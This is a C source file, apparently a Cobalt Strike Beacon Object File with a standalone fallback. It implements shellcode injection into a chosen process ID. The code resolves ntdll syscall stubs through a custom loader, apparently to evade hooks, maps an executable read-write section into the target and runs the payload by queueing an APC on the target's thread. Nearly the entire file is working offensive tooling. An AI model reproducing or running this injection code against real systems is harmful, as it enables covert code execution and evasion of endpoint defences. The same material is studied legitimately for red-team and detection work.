#define _WIN32_WINNT 0x0600
#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"


DWORD ntqueueapcthread(PROCESS_INFORMATION* lpProcessInfo, LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    PHMOD hNTDLL = NULL;
    NtCreateSection_t NtCreateSection = NULL;
    NtMapViewOfSection_t NtMapViewOfSection = NULL;
    NtUnmapViewOfSection_t NtUnmapViewOfSection = NULL;
    NtQueueApcThread_t NtQueueApcThread = NULL;
    NtSuspendThread_t NtSuspendThread = NULL;
    NtResumeThread_t NtResumeThread = NULL;
    NtClose_t NtClose = NULL;
    HANDLE hShellcodeSection = NULL;
    LARGE_INTEGER liShellcodeBufferSize;
    LPVOID lpMapViewOfShellcode = NULL;
    PVOID lpShellcodeBaseAddress = NULL;
   	SIZE_T dwViewSize = 0;
    DWORD dwSuspendCount = 0; 

/*
    internal_printf("hThread:               %p\n", lpProcessInfo->hThread);
    internal_printf("hProcess:              %p\n", lpProcessInfo->hProcess);
    internal_printf("dwProcessId:           %u\n", lpProcessInfo->dwProcessId);
    internal_printf("dwThreadId:            %u\n", lpProcessInfo->dwThreadId);
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    liShellcodeBufferSize.HighPart = 0;
    liShellcodeBufferSize.LowPart = dwShellcodeBufferSize;

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtCreateSection = (NtCreateSection_t)GetSyscallStub(hNTDLL, "NtCreateSection");
    NtMapViewOfSection = (NtMapViewOfSection_t)GetSyscallStub(hNTDLL, "NtMapViewOfSection");
    NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetSyscallStub(hNTDLL, "NtUnmapViewOfSection");
    NtQueueApcThread = (NtQueueApcThread_t)GetSyscallStub(hNTDLL, "NtQueueApcThread");
    NtResumeThread = (NtResumeThread_t)GetSyscallStub(hNTDLL, "NtResumeThread");
    NtSuspendThread = (NtSuspendThread_t)GetSyscallStub(hNTDLL, "NtSuspendThread");
    NtClose = (NtClose_t)GetSyscallStub(hNTDLL, "NtClose");
    if( (NULL == NtCreateSection) ||
        (NULL == NtMapViewOfSection) ||
        (NULL == NtUnmapViewOfSection) ||
		(NULL == NtQueueApcThread) ||
		(NULL == NtResumeThread) ||
		(NULL == NtSuspendThread) ||
		(NULL == NtClose)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Create shellcode section in current process
    dwErrorCode = NtCreateSection(
        &hShellcodeSection, 
        SECTION_ALL_ACCESS, 
        NULL, 
        &liShellcodeBufferSize,
		PAGE_EXECUTE_READWRITE, 
        SEC_COMMIT, 
        NULL
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtCreateSection failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Map view of shellcode section in current process
    dwErrorCode = NtMapViewOfSection(
        hShellcodeSection, 
        NtCurrentProcess(), 
        &lpMapViewOfShellcode, 
        0, 
        0, 
        NULL, 
        &dwViewSize, 
        1, 
        0, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtMapViewOfSection failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Copy shellcode into this mapped view in current process
    memcpy(lpMapViewOfShellcode, lpShellcodeBuffer, dwShellcodeBufferSize);
    
    // Map view of shellcode section into remote process
    dwErrorCode = NtMapViewOfSection(
        hShellcodeSection, 
        lpProcessInfo->hProcess, 
        &lpShellcodeBaseAddress, 
        0,
        0, 
        0, 
        &dwViewSize, 
        1, 
        0, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtMapViewOfSection failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Unmap view of shellcode section from current process
    dwErrorCode = NtUnmapViewOfSection(
        NtCurrentProcess(), 
        lpMapViewOfShellcode
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtUnmapViewOfSection failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Close the shellcode section in current process
    NtClose(hShellcodeSection);
    hShellcodeSection = NULL;
  
    // Suspend remote thread?
    dwErrorCode = NtSuspendThread(
        lpProcessInfo->hThread, 
        &dwSuspendCount
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtSuspendThread failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Queue APC in remote process thread
    dwErrorCode = NtQueueApcThread(
        lpProcessInfo->hThread, 
        lpShellcodeBaseAddress, 
        0, 
        NULL, 
        NULL
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtQueueApcThread failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Resume thread
    do
    {
        dwErrorCode = NtResumeThread(
            lpProcessInfo->hThread, 
            &dwSuspendCount
        );
        if (STATUS_SUCCESS != dwErrorCode)
        {
            internal_printf("NtResumeThread failed (%lu)\n", dwErrorCode);
            goto end;
        }
    } while (0 < dwSuspendCount);

end:

    if (hShellcodeSection)
    {
        NtClose(hShellcodeSection);
        hShellcodeSection = NULL;
    }

    return dwErrorCode;
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
    
    // Get the arguments <PID> <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    dwPid = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Get a handle to the injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__    
    internal_printf("ntqueueapcthread( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = ntqueueapcthread(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ntqueueapcthread failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Check to see if we received any arguments
    if (3 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }

    // Get the arguments <PID> <SHELLCODE>
    dwPid = atoi(argv[1]);
    if (USHRT_MAX < dwPid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PID: %s\n", argv[1]);
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }
    
    dwErrorCode = ReadFileIntoBuffer(argv[2], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to our injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__        
    internal_printf("ntqueueapcthread( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = ntqueueapcthread(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ntqueueapcthread failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
